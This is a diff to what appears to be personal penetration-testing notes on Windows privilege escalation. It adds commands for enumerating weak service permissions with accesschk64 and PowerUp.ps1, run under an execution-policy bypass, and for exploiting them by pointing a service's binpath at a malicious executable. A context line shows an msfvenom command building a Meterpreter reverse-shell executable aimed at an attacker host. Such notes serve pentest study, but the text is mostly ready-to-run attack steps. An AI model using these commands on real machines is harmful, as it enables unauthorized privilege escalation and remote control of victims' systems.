@@ -324,5 +324,27 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] -f exe -o x.exe
 ## DLL Hijacking
 
 ## Service Permissions
+### Enumeration
+#### Accesschk64
+```shell
+accesschk64 - uwcv Everyone *
+```
+#### PowerUP.ps1
+```shell
+powershell -ep bypass
+. .\Powerup.ps1
+Invoke-AllChecks
+```
+- Look in the `checking service permissions...` section
+### Exploitation
+#### Using binpath
+```shell
+sc config [svcname] binpath="[command or path to malicious executable]"
+sc start [svcname]
+```
 
 ## CVE-2019-1388
+
+
+# Todo
+- Find out if winPEAS detects the same as PowerUP
